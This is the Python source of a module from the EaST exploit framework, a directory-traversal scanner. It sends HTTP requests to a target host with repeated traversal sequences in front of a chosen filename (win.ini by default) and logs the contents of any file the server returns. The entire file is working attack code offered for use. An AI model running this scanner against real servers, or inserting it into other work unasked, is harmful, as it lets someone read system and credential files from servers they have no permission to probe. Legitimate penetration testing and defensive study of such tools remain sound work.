#!/usr/bin/env python
# The exploit is a part of Agora pack - use only under the license agreement
# specified in LICENSE.txt in your Agora distribution

import sys
import ssl
import urllib2
from collections import OrderedDict

sys.path.append("./core")
from Sploit import Sploit
from DirectoryTraversal import DirTrav

INFO = {}
INFO["NAME"] = "directory_traversal_scanner"
INFO["DESCRIPTION"] = "Looking for directory traversal vulnerability in given url"
INFO["VENDOR"] = "https://eastfw.com"
INFO['DOWNLOAD_LINK'] = 'https://github.com/C0reL0ader/EaST'
INFO['LINKS'] = ['']
INFO["CVE Name"] = ""
INFO["NOTES"] = """
"""
INFO["CHANGELOG"] = "15 Dec, 2017. Written by Gleg team."
INFO["PATH"] = "Tools/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["PATH"] = "/", dict(description = 'GET path')
OPTIONS['FILENAME'] = 'windows/win.ini', dict(description = 'Filename')
OPTIONS['SSL'] = False, dict(description = 'Use SSL')

NOT_FOUND = ['404', 'no such file', 'bad request', 'resource not found', 'not found', 'failed']

class exploit(Sploit):

    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self,logger=logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.path = OPTIONS["PATH"]
        self.filename = OPTIONS['FILENAME']
        self.ssl = False

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host)
        self.port = int(self.args.get("PORT", self.port))
        self.path = self.args.get("PATH", self.path)
        self.filename = self.args.get("FILENAME", self.filename)
        self.ssl = bool(self.args.get('SSL', False))

        if self.ssl:
            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
            opener = urllib2.build_opener(urllib2.HTTPSHandler(context=context))
            urllib2.install_opener(opener)

    def make_url(self, path = ''):
        return '{}{}:{}{}'.format(self.prot(), self.host, self.port, path)

    def prot(self):
        return self.ssl and 'https://' or 'http://'

    def is_not_found(self, text):
        for item in NOT_FOUND:
            if item in text:
                return True
        return False
        
    def run(self):
        self.args()
        self.log("Scanning {}".format(self.host))
        
        result = OrderedDict()
        xpath = DirTrav().xpath
        
        for p in xpath:
            for i in range(16):
                url = self.path
                url += p * i
                url += self.filename
                url = self.make_url(url)
                try:
                    fd = urllib2.urlopen(url, timeout=5)
                    content = fd.read()
                    if fd.code == 200 and not self.is_not_found(content):
                        result[url] = content
                        break
                except Exception as e:
                    pass
        self.log()
        self.log('Found: {} urls which returns HTTP 200 code'.format(len(result)))
        for key in result:
            self.log('URL: ' + key)
            self.log(result[key])
            self.log()
        
        self.finish(True)

if __name__ == '__main__':
    print ("Running exploit %s .. " % INFO['NAME'])
    e = exploit("localhost")
    e.run()